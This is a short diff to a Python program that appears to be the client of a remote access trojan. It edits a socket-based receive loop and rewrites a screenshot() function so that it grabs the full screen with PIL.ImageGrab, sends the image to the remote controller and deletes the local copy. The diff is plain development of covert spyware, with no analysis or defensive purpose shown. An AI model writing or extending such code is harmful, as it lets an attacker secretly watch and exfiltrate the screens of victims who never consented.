@@ -7,7 +7,7 @@ import os
 import shutil
 import sys
 import requests
-from mss import mss
+import PIL.ImageGrab
 
 
 def client():
@@ -70,10 +70,11 @@ def reliable_recv():
         try:
             json_data = json_data + s.recv(1024)
             return json.loads(json_data.decode())
-        except ValueError as e:
+        except ValueError:
+            continue
+        except Exception as e:
             if debug:
                 print(e)
-            continue
 
 
 def screenshot():
@@ -82,10 +83,9 @@ def screenshot():
     """
     try:
         filename = "capture.png"
-        with mss() as screen:
-            screen.shot(mon=-1, output=filename)
-        with open(filename, "rb") as file:
-            reliable_send(base64.b64encode(file.read()))
+        capture = PIL.ImageGrab.grab()
+        capture.save(filename)
+        download(filename)
         os.remove(filename)
     except Exception as e:
         reliable_send("Error taking the screenshot")
